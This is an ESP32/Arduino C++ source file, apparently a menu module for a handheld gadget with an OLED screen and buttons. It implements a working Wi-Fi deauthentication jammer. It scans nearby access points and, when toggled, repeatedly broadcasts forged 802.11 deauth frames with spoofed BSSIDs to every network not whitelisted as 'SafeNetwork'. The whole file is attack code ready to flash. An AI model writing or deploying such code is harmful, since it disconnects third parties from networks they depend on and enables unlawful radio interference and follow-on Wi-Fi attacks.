#include <Arduino.h>
#include <U8g2lib.h>
#include <WiFi.h>
#include "wifideauth.h"
#include "esp_wifi.h"

// Shared display instance from main
extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// Button definitions
#define BUTTON_TOGGLE_PIN 26   // UP toggles deauth
#define BUTTON_EXIT_PIN   27   // RIGHT exits to menu

// Rate limit deauth sweeps
static const unsigned long SWEEP_INTERVAL = 200; // ms

// Deauth toggle debounce
static const unsigned long TOGGLE_DEBOUNCE = 200;

// AP info storage
#define MAX_APS 20
struct AP_Info {
    uint8_t bssid[6];
    int     channel;
    String  ssid;
};
static AP_Info ap_list[MAX_APS];
static int     ap_count = 0;

// State
static bool     deauthActive = false;
static unsigned long lastToggle = 0;
static unsigned long lastSweep  = 0;

// Frame template
static uint8_t deauth_frame[26] = {
    0xC0,0x00,0x3A,0x01,
    // dest, src, bssid to be filled
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00
};

// Helpers
static bool isWhitelisted(const String &ssid) {
    return ssid.indexOf("SafeNetwork") >= 0;
}

// Send a few deauth frames, yielding to the scheduler
static void sendFrame(const uint8_t bssid[6], int channel) {
    static const uint8_t client[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame + 4,  client, 6);
    memcpy(deauth_frame + 10, bssid,  6);
    memcpy(deauth_frame + 16, bssid,  6);
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        delay(0); // yield
    }
}

// Scan APs once
static void scanAPs() {
    int n = WiFi.scanNetworks(false, true);
    ap_count = (n > MAX_APS) ? MAX_APS : n;
    for (int i = 0; i < ap_count; i++) {
        memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
        ap_list[i].channel = WiFi.channel(i);
        ap_list[i].ssid    = WiFi.SSID(i);
    }
    WiFi.scanDelete();
}

// Deauth sweep over all non-whitelisted APs
static void deauthSweep() {
    for (int i = 0; i < ap_count; i++) {
        if (!isWhitelisted(ap_list[i].ssid)) {
            sendFrame(ap_list[i].bssid, ap_list[i].channel);
        }
    }
}

void wifiDeauthSetup() {

    Serial.begin(115200);

    // Initialize Wi-Fi in AP_STA mode
    WiFi.mode(WIFI_AP_STA);
    delay(500);
    esp_wifi_set_promiscuous(true);

    // Show loading message
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    const char* load = "Loading Deauth...";
    int lw = u8g2.getUTF8Width(load);
    u8g2.drawStr((128 - lw)/2, 32, load);
    u8g2.sendBuffer();

    // Perform one-time scan
    scanAPs();

    // Reset state
    deauthActive = false;
    lastToggle  = millis();
    lastSweep   = millis();

    // Show ready prompt
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    u8g2.drawStr(20, 20, "WiFi Deauth Ready");
    u8g2.drawStr(10, 40, "UP:toggle RIGHT:exit");
    u8g2.sendBuffer();
}

bool wifiDeauthLoop() {
    Serial.print("DeauthLoop: toggle=");
    Serial.print(digitalRead(BUTTON_TOGGLE_PIN));
    Serial.print("  exit=");
    Serial.println(digitalRead(BUTTON_EXIT_PIN));

    unsigned long now = millis();

    // Handle toggle on UP button
    if (digitalRead(BUTTON_TOGGLE_PIN) == LOW &&
        now - lastToggle > TOGGLE_DEBOUNCE) {
        deauthActive = !deauthActive;
        lastToggle = now;
    }

    // If active and it's time, perform a sweep
    if (deauthActive && now - lastSweep > SWEEP_INTERVAL) {
        deauthSweep();
        lastSweep = now;
    }

    // Draw status
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_ncenB08_tr);
    if (deauthActive) {
        u8g2.drawStr(20, 32, "Deauth ACTIVE");
    } else {
        u8g2.drawStr(50, 32, "Paused");
    }
    u8g2.sendBuffer();

    // Exit on RIGHT button press
    if (digitalRead(BUTTON_EXIT_PIN) == LOW) {
        // Wait for release
        while (digitalRead(BUTTON_EXIT_PIN) == LOW) {
            delay(10);
        }
        return true;
    }

    return false;

    delay(50);
}
